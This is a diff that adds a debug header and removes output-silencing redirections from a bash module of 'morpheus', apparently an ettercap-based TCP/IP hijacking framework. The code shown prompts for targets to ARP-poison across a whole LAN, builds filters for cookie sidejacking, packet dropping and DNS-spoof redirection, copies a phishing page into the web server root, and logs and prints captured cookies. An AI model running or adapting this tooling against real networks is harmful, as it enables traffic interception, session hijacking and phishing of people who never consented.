@@ -48,6 +48,18 @@ Reset="${Escape}[0m";
 
 
 
+###
+# DEBUG SCRIPT OF MORPHEUS
+###
+Colors;
+if [ -e morpheus.sh ]; then
+ :
+else
+echo ${RedF}[x]${white} Copy [${GreenF} me ${white}] to morpheus main folder and execute [${GreenF} me ${white}] from there ..${Reset};
+echo ${RedF}[x]${white} Also remmenber to config the settings File to store logfiles ..${Reset};
+exit
+fi
+
 
 # ---------------------
 # Variable declarations
@@ -57,21 +69,21 @@ V3R="2.1"                            # module version number
 cnm="oneiroi_phobetor"               # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
-GaTe=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1    # gateway
-IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1 # ip-range
-PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
-LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
-IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
-Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
-Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
-ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1
-LoGmSf=`cat $IPATH/settings | egrep -m 1 "LOG_MSF" | cut -d '=' -f2` > /dev/null 2>&1
-TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2` > /dev/null 2>&1
-UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
-MsGnA=`cat $IPATH/settings | egrep -m 1 "MSG_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
-PrEfI=`cat $IPATH/settings | egrep -m 1 "PREFIX" | cut -d '=' -f2` > /dev/null 2>&1
-DrIn=`cat $IPATH/settings | egrep -m 1 "DRI_NET" | cut -d '=' -f2` > /dev/null 2>&1
-RbUdB=`cat $IPATH/settings | egrep -m 1 "REBUILD_DB" | cut -d '=' -f2` > /dev/null 2>&1
+GaTe=`ip route | grep "default" | awk {'print $3'}`    # gateway
+IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` # ip-range
+PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2`
+LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2`
+IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2`
+Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2`
+Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2`
+ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2`
+LoGmSf=`cat $IPATH/settings | egrep -m 1 "LOG_MSF" | cut -d '=' -f2`
+TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2`
+UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2`
+MsGnA=`cat $IPATH/settings | egrep -m 1 "MSG_SNARF" | cut -d '=' -f2`
+PrEfI=`cat $IPATH/settings | egrep -m 1 "PREFIX" | cut -d '=' -f2`
+DrIn=`cat $IPATH/settings | egrep -m 1 "DRI_NET" | cut -d '=' -f2`
+RbUdB=`cat $IPATH/settings | egrep -m 1 "REBUILD_DB" | cut -d '=' -f2`
 
 
 
@@ -207,10 +219,10 @@ esac
 
 
 # config internal framework settings
-ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings...\nip addr, ip range, gateway, interface\netter.conf, etter.dns, uid/gid privileges." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
+ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings...\nip addr, ip range, gateway, interface\netter.conf, etter.dns, uid/gid privileges." --percentage=0 --auto-close --width 290
 if [ -e $Econ ]; then
-  cp $Econ /tmp/etter.conf > /dev/null 2>&1
-  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
+  cp $Econ /tmp/etter.conf
+  cp $IPATH/bin/etter.conf $Econ
   sleep 1
 else
   echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
@@ -227,46 +239,46 @@ trap ctrl_c INT
 ctrl_c() {
 echo "${RedF}[x]${white} CTRL+C Abort current tasks${RedF}...${Reset}"
 # clean logfiles folder at exit
-rm $IPATH/logs/parse > /dev/null 2>&1
-rm $IPATH/logs/lan.mop > /dev/null 2>&1
+rm $IPATH/logs/parse
+rm $IPATH/logs/lan.mop
 rm $IPATH/logs/triggertwo > /dev/nul 2>&1
-rm $IPATH/output/firewall.ef > /dev/null 2>&1
-rm $IPATH/output/template.ef > /dev/null 2>&1
-rm $IPATH/output/redirect.ef > /dev/null 2>&1
-rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
-rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
-rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
-rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
-rm $IPATH/output/img_replace.ef > /dev/null 2>&1
-rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
-rm $IPATH/output/chat_services.ef > /dev/null 2>&1
-rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
-rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1
+rm $IPATH/output/firewall.ef
+rm $IPATH/output/template.ef
+rm $IPATH/output/redirect.ef
+rm $IPATH/output/EasterEgg.ef
+rm $IPATH/output/UserAgent.ef
+rm $IPATH/output/grab_hosts.ef
+rm $IPATH/output/packet_drop.ef
+rm $IPATH/output/img_replace.ef
+rm $IPATH/output/sidejacking.ef
+rm $IPATH/output/chat_services.ef
+rm $IPATH/output/dhcp-discovery.ef
+rm $IPATH/output/cryptocurrency.ef
 # revert filters to default stage
-mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
-mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
-mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1
-mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
-mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1
-mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
-mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
-mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
-mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
-mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1
-mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
-mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
-mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1
-rm -r $IPATH/logs/capture > /dev/null 2>&1
-rm $ApachE/index.html > /dev/null 2>&1
-rm $ApachE/cssbanner.js > /dev/null 2>&1
-rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
-mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft
+mv $IPATH/filters/template.rb $IPATH/filters/template.eft
+mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft
+mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft
+mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft
+mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft
+mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft
+mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft
+mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft
+mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft
+mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft
+mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft
+mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html
+rm -r $IPATH/logs/capture
+rm $ApachE/index.html
+rm $ApachE/cssbanner.js
+rm -R $ApachE/"Google Sphere_files"
+mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
 # revert ettercap conf files to default stage
 if [ -e $Edns ]; then
-mv /tmp/etter.dns $Edns > /dev/null 2>&1
+mv /tmp/etter.dns $Edns
 fi
 if [ -e $Econ ]; then
-mv /tmp/etter.conf $Econ > /dev/null 2>&1
+mv /tmp/etter.conf $Econ
 fi
 sleep 2
 exit
@@ -291,22 +303,22 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
+  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit firewall.eft${RedF}!${Reset};
   sleep 1
-fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
+fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270)
+fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270)
 
 
   cd $IPATH/filters
@@ -316,13 +328,13 @@ fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose la
   dIsd=`uname -r`
   # replace values in template.filter with sed bash command
   sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
-  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
-  rm /tmp/test > /dev/null 2>&1
+  sed -i "s|TaRTWO|$fil_two|g" firewall.eft
+  sed -i "s|hOst|$hOstNaMe|g" firewall.eft
+  sed -i "s|MoDeM|$GaTe|g" firewall.eft
+  sed -i "s|DisTr|$dIsd|g" firewall.eft
+  rm /tmp/test
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
   sleep 1
 
@@ -361,16 +373,16 @@ fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose la
   # check if exist any reports
   dd=`ls $IPATH/logs`
   if ! [ -z "$dd" ]; then
-  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
   fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
+  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/firewall.ef > /dev/null 2>&1
+  rm $IPATH/output/firewall.ef
   cd $IPATH
 
 else
@@ -399,30 +411,30 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-rm $IPATH/logs/sidejacking.log > /dev/null 2>&1
+rm $IPATH/logs/sidejacking.log
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
+  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
   sleep 1
-  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270)
+  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through morpheus." --entry --width 270)
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
-  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft > /dev/null 2>&1
+  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
   sleep 1
 
@@ -462,9 +474,9 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cd $IPATH/logs
   # delete utf-8/non-ancii caracters from tcp data captured
   tr -cd '\11\12\15\40-\176' < sidejacking.log > clean-file.log
-  mv clean-file.log sidejacking.log > /dev/null 2>&1
+  mv clean-file.log sidejacking.log
   # store captured data (cookies) into one variable
-  fdd=`cat $IPATH/logs/sidejacking.log` > /dev/null 2>&1
+  fdd=`cat $IPATH/logs/sidejacking.log`
   # check if variable its 'empty'
   if ! [ -z "$fdd" ]; then
   echo ""
@@ -473,16 +485,16 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   echo "$fdd"
   echo ""
   # warn users that we have data stored into a logfile
-  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
   fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
+  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
+  rm $IPATH/output/sidejacking.ef
   cd $IPATH
 
 else
@@ -510,7 +522,7 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 ch=`which tcpkill`
@@ -524,21 +536,21 @@ fi
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
+  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
   sleep 1
 
@@ -576,15 +588,15 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
+  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
+  rm $IPATH/output/packet_drop.ef
   cd $IPATH
   # stop background running proccess
-  # sudo pkill ettercap > /dev/null 2>&1
-  # sudo pkill tcpkill > /dev/null 2>&1
+  # sudo pkill ettercap
+  # sudo pkill tcpkill
 
 else
   echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
@@ -610,28 +622,28 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: 31.192.120.44\nWARNING: next value must be decimal..." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: 31.192.120.44\nWARNING: next value must be decimal..." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
+  cp $IPATH/bin/etter.dns etter.rb # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
-  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
+  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft
   cd $IPATH
   sleep 1
 
@@ -641,7 +653,7 @@ echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
 sleep 1
 xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -670,11 +682,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  rm $IPATH/output/redirect.ef > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
+  rm $IPATH/output/redirect.ef
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft # backup
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -704,30 +716,30 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
-  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
+  cp $IPATH/bin/etter.dns etter.rb # backup
+  cp $Edns /tmp/etter.dns # backup
+  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
-  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
-  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
+  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft
   # copy files needed to apache2 webroot...
-  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE > /dev/null 2>&1
-  cp $IPATH/bin/phishing/index.html $ApachE > /dev/null 2>&1
+  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE
+  cp $IPATH/bin/phishing/index.html $ApachE
   cd $IPATH
   sleep 1
 
@@ -737,7 +749,7 @@ echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
 sleep 1
 xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
